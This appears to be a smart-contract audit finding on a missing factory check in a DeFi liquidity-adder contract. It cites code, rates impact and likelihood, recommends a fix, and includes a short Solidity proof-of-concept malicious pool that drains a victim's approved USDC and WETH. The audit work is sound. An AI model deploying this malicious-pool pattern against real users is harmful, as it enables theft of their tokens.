Audit Report

## Title
Missing Factory Pool Validation in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User-Approved Tokens - (File: metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol)

## Summary
`MetricOmmPoolLiquidityAdder` accepts an arbitrary `pool` address in all public entry points without verifying it against the factory registry. A malicious pool passed by a tricked user becomes the `expectedPool` stored in transient context, satisfying the only callback guard (`msg.sender == expectedPool`), and then controls which tokens are pulled and to whom — up to the user-supplied caps.

## Finding Description
`MetricOmmSwapRouterBase._requireFactoryPool` enforces factory membership on every pool before use: [1](#0-0) 

`MetricOmmPoolLiquidityAdder` has no equivalent check. Its NatSpec explicitly documents the omission: [2](#0-1) 

`addLiquidityExactShares` and `addLiquidityWeighted` pass the caller-supplied `pool` directly into `_addLiquidity`: [3](#0-2) 

`_addLiquidity` stores the unvalidated pool as `expectedPool` in transient storage, then calls into it: [4](#0-3) 

In `metricOmmModifyLiquidityCallback`, the only caller check compares `msg.sender` against `expectedPool` — which is the attacker-controlled address: [5](#0-4) 

Token addresses are then read directly from `msg.sender` (the malicious pool): [6](#0-5) 

`pay()` calls `safeTransferFrom(payer, recipient, value)` when `payer != address(this)`, transferring from the victim to the malicious pool: [7](#0-6) 

For `addLiquidityWeighted`, the malicious pool can additionally revert the probe with an inflated `LiquidityProbe(need0, need1)` to manipulate the scale ratio and maximize the pull amount before the paying call: [8](#0-7) 

## Impact Explanation
Direct loss of user principal. Any user who has approved `MetricOmmPoolLiquidityAdder` for a token (e.g., USDC, WETH) can have up to `maxAmountToken0` and `maxAmountToken1` of those tokens stolen in a single transaction. The malicious pool controls which tokens are pulled (via `getImmutables()`) and the amounts (via callback arguments), bounded only by the user-supplied caps. This is a Critical/High direct loss of user principal matching the allowed impact gate.

## Likelihood Explanation
Medium. The user must be induced to call `addLiquidityExactShares` or `addLiquidityWeighted` with a malicious pool address. This is achievable via a phishing frontend, a compromised SDK, or a malicious referral link — all realistic attack vectors for a DeFi periphery contract. No privileged access is required; any unprivileged attacker can deploy a conforming malicious pool contract.

## Recommendation
Add factory validation to the `pool` parameter in all public entry points of `MetricOmmPoolLiquidityAdder`, mirroring the pattern already used in `MetricOmmSwapRouterBase`:

```solidity
// Store factory as immutable in constructor:
IMetricOmmPoolFactory internal immutable FACTORY;

// In each public addLiquidity* function, before _addLiquidity():
if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
```

This is the same guard used in `MetricOmmSwapRouterBase._requireFactoryPool` and eliminates the inconsistency between the router and the liquidity adder.

## Proof of Concept

```solidity
contract MaliciousPool {
    address immutable victim;
    address immutable usdc;
    address immutable weth;
    address immutable adder;

    constructor(address _victim, address _usdc, address _weth, address _adder) {
        victim = _victim; usdc = _usdc; weth = _weth; adder = _adder;
    }

    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = usdc;
        imm.token1 = weth;
    }

    function addLiquidity(address, uint80, LiquidityDelta calldata, bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        IMetricOmmPoolLiquidityAdder(adder).metricOmmModifyLiquidityCallback(
            1_000e6, 1e18, abi.encode(uint8(1)) // KIND_PAY
        );
        return (1_000e6, 1e18);
    }
}

// Attack:
// 1. Victim approves MetricOmmPoolLiquidityAdder for USDC and WETH
// 2. Victim is tricked into calling:
adder.addLiquidityExactShares(
    address(maliciousPool), victim, 0, deltas,
    1_000e6, 1e18, ""
);
// Result: 1000 USDC and 1 WETH transferred from victim to MaliciousPool
```

### Citations

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L87-89)
```text
  function _requireFactoryPool(address pool) internal view {
    if (!FACTORY.isPool(pool)) revert IMetricOmmSimpleRouter.InvalidPool(pool);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L64-68)
```text
  ) external payable override returns (uint256 amount0Added, uint256 amount1Added) {
    _validateOwner(owner);
    _validateDeltas(deltas);
    return _addLiquidity(pool, owner, salt, deltas, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L106-114)
```text
    try IMetricOmmPoolActions(pool)
      .addLiquidity(owner, salt, weightDeltas, abi.encode(KIND_PROBE), extensionData) returns (
      uint256, uint256
    ) {
      revert WeightedProbeInconclusive();
    } catch (bytes memory reason) {
      (uint256 need0, uint256 need1) = _decodeLiquidityProbeOrBubble(reason);
      LiquidityDelta memory scaled = _scaleWeightsToShares(weightDeltas, maxAmountToken0, maxAmountToken1, need0, need1);
      return _addLiquidity(pool, owner, salt, scaled, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-164)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L169-177)
```text
    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L193-196)
```text
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L85-87)
```text
    } else {
      IERC20(token).safeTransferFrom(payer, recipient, value);
    }
```
